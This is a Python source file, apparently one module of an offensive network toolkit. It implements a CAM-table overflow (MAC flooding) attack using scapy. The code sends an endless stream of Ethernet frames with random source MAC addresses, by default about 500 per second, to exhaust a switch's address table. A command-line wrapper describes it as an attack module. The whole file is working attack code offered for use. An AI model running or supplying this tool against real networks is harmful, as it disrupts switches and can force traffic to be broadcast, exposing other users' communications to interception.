import time
from scapy.all import Ether, hexdump, conf
from src.envena.utils.functions import rand_eth
from random import uniform
from src.envena.core.arguments import public_args
from src.envena.core.tool import Tool
from src.envena.core.protocols.ethernet.ether import EtherPacket, EtherPacketType
from secrets import token_hex


def cam_overflow(param, logger, ws=None)->None:
    # param.timeout = 0.002 if not param.timeout else param.timeout
    # sent_packets = 0
    # param.iface = conf.iface if not param.iface else param.iface
    # param.input = 'X'*64 if not param.input else param.input
    
    try:
        
        eth_src=rand_eth()
        hexdump(Ether(src=rand_eth(), dst=str(param.eth_dst).replace('-',':') if param.eth_dst else rand_eth()) / (token_hex(32)))
        sent_packets = 0
        while True:
            try:
                # eth_src=rand_eth()
                # sendp(Ether(src=eth_src, dst=param.eth_dst if param.eth_dst else rand_eth()) / (param.input), verbose=False, iface=param.iface)
                eth_src = rand_eth()
                
                EtherPacket(
                    iface=param.iface, count=1, timeout=0, eth_src=eth_src, 
                    eth_dst=param.eth_dst if param.eth_dst else rand_eth(), 
                    packet_type=EtherPacketType.Ether, 
                    payload=token_hex(32)).send_packet(printed=False)
                
                logger.info(f"{sent_packets}... Sent ethernet frame from MAC: {eth_src}")
                sent_packets += 1
            except Exception as e:
                logger.error(f"Packet was not sent: {e}")
            time.sleep(round(uniform(0, param.timeout), 3)) # 1 packet on 0,002 sec is optimal
    except KeyboardInterrupt:
        logger.info(f"{sent_packets} packet(s) sent")

t_camoverflow = Tool(tool_func=cam_overflow, VERSION=1.1)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description=f"CAM-overflow attack module")
    parser.add_argument("-i", "--iface", help="network iface send from", required=False, default=str(conf.iface), type=str)
    parser.add_argument("-ed", "--eth_dst", help="destination MAC-address", required=False, default=rand_eth(), type=str)
    # parser.add_argument("-p", "--payload", help="payload content. The default is 'X' in 64 times", required=False, default='X'*64)
    parser.add_argument("-t", "--timeout", help="timeout between of sending packets. The default is 0.002 (~500 packets/sec)", 
                        required=False, type=float, 
                        default=0.002)

    cli_args = parser.parse_args()

    public_args.timeout = cli_args.timeout
    public_args.eth_dst = cli_args.eth_dst
    public_args.iface = cli_args.iface
    # args.input = cli_args.payload
    
    
    t_camoverflow.start_tool()
